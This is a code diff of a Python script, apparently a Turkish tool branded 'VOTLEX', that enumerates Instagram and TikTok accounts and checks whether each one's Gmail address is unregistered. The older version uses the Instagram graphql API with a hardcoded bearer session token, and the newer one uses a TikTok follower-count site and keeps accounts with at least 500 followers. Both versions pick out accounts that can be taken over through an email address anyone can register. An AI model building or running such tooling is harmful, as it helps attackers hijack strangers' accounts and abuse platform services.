-        (9) : {X}CHECKLENEN EMAİL {email} ''')
+{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
         
-    
 
 
 
@@ -352,61 +256,89 @@ def votlex_gmail(email):
 ).text
 
         if '"gf.uar",1' in response:
-            votlex_insta(email)
+            votlex_tiktok(email)
             basarli_gmail += 1
             os.system('clear')
+            print(logo)
             print(f''' 
-𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 «««(𝐕𝐎𝐓𝐋𝐄𝐗)»»»»
-___________________________________
-(1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
-(2) : {E}HATALI İG {a6}{hatali_ig}
-(3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
-(4) : {E}HATALI GMAİL {a5}{hatali_gmail}
-(9) : {X}CHECKLENEN EMAİL {email} ''')
+{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
 
         elif '"gf.uar",2' in response or '"gf.uar",3' in response:
             hatali_gmail += 1
             os.system('clear')
+            print(logo)
             print(f''' 
-𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 ««««(𝐕𝐎𝐓𝐋𝐄𝐗)»»»»»
-___________________________________
-(1) : {F}BAŞARLI İG  (HİT) {B}{basarli_ig}
-(2) : {E}HATALI İG {a6}{hatali_ig}
-(3) : {a2}BAŞARLI GMAİL {a2}{basarli_gmail}
-(4) : {E}HATALI GMAİL {a5}{hatali_gmail}
-(9) : {X}CHECKLENEN EMAİL {email} ''')
+{F}(HİT) {F}({basarli_tt})  {E}HATALI TT {a6}({hatali_tt})  {X}BAŞARLI GM{X} ({basarli_gmail})  {E}HATALI GM {a5}({hatali_gmail}) ''')
     
     except Exception as e:
         print(e)
     return False
-  
 
 
-HEADERS = {"x-bloks-version-id":"8ca96ca267e30c02cf90888d91eeff09627f0e3fd2bd9df472278c9a6c022cbb","user-agent":"Instagram 275.0.0.27.98 Android (28/9; 240dpi; 720x1280; Asus; ASUS_I003DD; ASUS_I003DD; intel; en_US; 458229258)","authorization":"Bearer IGT:2:eyJkc191c2VyX2lkIjoiNTI1MjEwODYyODIiLCJzZXNzaW9uaWQiOiI1MjUyMTA4NjI4MiUzQUt4VGg2UUFzam5teVlIJTNBMjUlM0FBWWQtcXhaZGRTanNyQ3o2eW1ud0NuUGNINFpwbVd1a0JMN2p4Wm5Gb2cifQ=="}
 
-        
-def tkip():
-    while True:
-        try:
-            user_id = str(random.randrange(15000000, 240205236))[:].zfill(8)  
-            data = {
-                "lsd": user_id,
-                "variables": '{"id":"' + user_id + '","render_surface":"PROFILE"}',
-                "server_timestamps": 'true',
-                "doc_id": '25313068075003303'
-            }
-            HEADERS['X-Fb-Lsd'] = user_id
-            response = requests.post("https://www.instagram.com/api/graphql", headers=HEADERS, data=data).json()
-            if 'data' in response and 'user' in response['data'] and 'username' in response['data']['user']:
-                username = response['data']['user']['username']
-                email = username
+
+
+
+
+
+import requests
+import random
+import string
+import concurrent.futures
+
+checked_users = set()
+
+def generate_username():
+    return ''.join(random.choice(string.ascii_lowercase) for _ in range(random.randint(6, 9)))
+
+def fetch_tiktok_data(username):
+    headers = {
+        'authority': 'tiktok.livecounts.io',
+        'origin': 'https://tokcounter.com',
+        'referer': 'https://tokcounter.com/',
+        'user-agent': 'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
+    }
+    
+    try:
+        r = requests.get(f'https://tiktok.livecounts.io/user/search/{username}', headers=headers)
+        if r.status_code == 200:
+            return r.json()
+    except:
+        return None
+    return None
+
+def process_user():
+    username = generate_username()
+    
+    if username in checked_users:
+        return None
+
+    checked_users.add(username)
+    res = fetch_tiktok_data(username)
+
+    if res and res.get('success'):
+        for u in res.get('userData', []):
+            followers = u.get('stats', {}).get('followers', 0)
+            if followers >= 500:
+                email = u['id']
                 votlex_gmail(email)
-        except Exception:
-            continue
+                return email  
+    
+    return None
 
-                     
-def hiz(vtl):
-    for _ in range(vtl):
-        Thread(target=tkip).start()
+def votlex5(count=10, threads=10):
+    results = []
+    
+    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
+        futures = [executor.submit(process_user) for _ in range(count)]
+        
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result:
+                results.append(result)
+
+    return results
+
 if __name__ == "__main__":
-    hiz(15)
+    for email in votlex5(count=1000, threads=20):
+        print(email)
